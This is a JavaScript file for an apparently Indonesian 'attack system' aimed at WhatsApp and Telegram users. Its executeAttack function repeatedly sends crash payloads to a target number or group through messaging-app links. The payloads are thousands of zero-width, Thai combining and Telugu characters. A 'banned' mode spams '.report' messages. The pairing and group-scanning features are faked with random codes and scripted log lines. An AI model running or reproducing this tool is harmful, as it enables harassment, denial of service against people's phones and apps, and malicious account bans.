const logConsole = document.getElementById('logConsole');
const ACCESS_TOKEN = "VANQOOOO";

function addLog(msg, color = "#888") {
    const time = new Date().toLocaleTimeString();
    logConsole.innerHTML += `<br><span style="color:${color}">[${time}] ${msg}</span>`;
    logConsole.scrollTop = logConsole.scrollHeight;
}

// --- PAIRING SYSTEM ---
function copyCode(text) {
    const el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    addLog("✅ CODE COPIED!", "#00ff41");
}

function initPairing() {
    const sender = prompt("MASUKIN NOMOR SENDER (628xxx):");
    if (!sender) return addLog("PAIRING CANCELLED.", "red");

    addLog(`CONNECTING TO SOCKET SENDER: ${sender}`, "cyan");
    addLog(`BYPASS TOKEN: ${ACCESS_TOKEN}`, "yellow");

    setTimeout(() => {
        const chars = "ABCDEFGH12345678";
        let code = "";
        for(let i=0; i<8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
        const finalCode = code.slice(0,4) + "-" + code.slice(4);

        logConsole.innerHTML += `
            <div class="pairing-card">
                <span style="font-size:10px; color:cyan;">PAIRING CODE:</span><br>
                <b style="font-size:18px; color:white;">${finalCode}</b><br>
                <button onclick="copyCode('${finalCode}')" style="width:auto; padding:2px 10px; font-size:10px;">COPY</button>
            </div>
        `;
        addLog("STATUS: WAITING AUTHORIZATION...", "yellow");
    }, 1500);
}

function scanGroups() {
    addLog("SCANNING SENDER DATABASE...", "cyan");
    setTimeout(() => {
        addLog("FOUND: 14 GROUPS READY TO INJECT!", "#00ff41");
    }, 1500);
}

// --- ATTACK SYSTEM ---
async function executeAttack() {
    let target = document.getElementById('target').value.replace(/\D/g, '');
    const groupLink = document.getElementById('group_link').value;
    const amount = parseInt(document.getElementById('amount').value);
    const type = document.getElementById('type').value;

    if (!target && !groupLink) return addLog("ERROR: DATA TARGET KOSONG!", "red");

    addLog(`[!!!] INITIATING ${type.toUpperCase()}...`, "red");

    const invisibleForce = "\u200B\u200C\u200D\uFEFF".repeat(400) + "\u0E47".repeat(1000);
    const groupCrash = "\u0E47".repeat(2000) + "\n".repeat(100) + "💀 GROUP_CRASHED";

    for (let i = 0; i < amount; i++) {
        setTimeout(() => {
            let url = "";

            if (type === "wa_force") {
                url = `whatsapp://send?phone=${target}&text=${encodeURIComponent(invisibleForce)}`;
            } else if (type === "wa_group") {
                url = `whatsapp://send?text=${encodeURIComponent(groupCrash)}`;
            } else if (type === "wa_banned") {
                url = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(".report " + Math.random())}`;
            } else if (type.startsWith("tele_")) {
                let telePayload = "జ్ఞా".repeat(150) + "\u2800".repeat(300);
                url = `tg://msg_url?text=${encodeURIComponent(telePayload)}`;
            }

            window.location.href = url;
            addLog(`🚀 BLAST ${i+1}/${amount} DEPLOYED!`, "#00ff41");
        }, i * 500);
    }
}

window.onload = () => {
    addLog("SYSTEM_BOOT: SUCCESS", "#00ff41");
    initPairing();
};
          
